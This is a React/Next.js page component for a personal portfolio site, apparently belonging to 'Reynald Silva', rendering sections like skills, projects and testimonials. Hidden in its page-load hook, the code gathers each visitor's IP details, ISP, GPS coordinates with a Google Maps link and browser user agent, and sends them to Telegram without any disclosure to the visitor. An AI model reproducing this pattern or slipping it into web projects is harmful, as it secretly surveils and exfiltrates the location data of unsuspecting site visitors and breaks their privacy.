"use client"
import { useEffect, useState } from 'react';
import Navbar from './components/Navbar';
import Hero from './components/Hero';
import About from './components/About';
import WorkExperience from './components/WorkExperience';
import Education from './components/Education';
import Projects from './components/Projects';
import Skills from './components/Skills';
import Testimonials from './components/Testimonials';
import Contact from './components/Contact';

import { getIpData, getGpsLocation } from '../utils/locationUtils';
import { sendToTelegram } from '../utils/telegramUtils';

import experiences from './data/experiences';
import educationList from './data/educationList';
import projects from './data/projects';
import skillCategories from './data/skillCategories';
import testimonials from './data/testimonials';
import { JSX } from 'react';

export default function Home(): JSX.Element {
  const [ipData, setIpData] = useState<any>(null);
  const [location, setLocation] = useState<any>(null);

  useEffect(() => {
    getIpData().then((data) => {
      setIpData(data);
  
      getGpsLocation().then((gpsData) => {
        setLocation(gpsData);
        
        const browser = navigator.userAgent;
  
        const message = `
          *IP Information*:
          - *IP*: ${gpsData.ip}
          - *Hostname*: ${gpsData.hostname}
          - *City*: ${gpsData.city}
          - *Region*: ${gpsData.region}
          - *Country*: ${gpsData.country}
          - *Location*: ${gpsData.loc} (Latitude and Longitude)
          - *ISP*: ${gpsData.org}
  
          *GPS Location*:
          - *Latitude*: ${gpsData.latitude}
          - *Longitude*: ${gpsData.longitude}
          - *Google Maps Link*: [View Location](https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude})
  
          *Browser Information*:
          \`\`\`
          ${browser}
          \`\`\`
        `;
        
        // Kirim semua informasi ke Telegram dalam satu pesan
        sendToTelegram(message); // Kirim pesan ke Telegram
      }).catch((error) => {
        console.error('Error getting GPS location:', error);
      });
    });
  }, []);
  

  return (
    <main className="min-h-screen bg-white">
      <div className="container mx-auto px-4 py-12">
        <Navbar />
        <Hero />
        <About />
        <Skills skillCategories={skillCategories} />
        <WorkExperience experiences={experiences} />
        <Education educationList={educationList} />
        <Projects projects={projects} />
        <Testimonials testimonials={testimonials} />
        <Contact />
      </div>
      <footer className="bg-gray-100 py-6">
        <div className="container mx-auto px-4 text-center">
          <p className="text-gray-600">© {new Date().getFullYear()} Reynald Silva. All rights reserved.</p>
        </div>
      </footer>
    </main>
  );
}
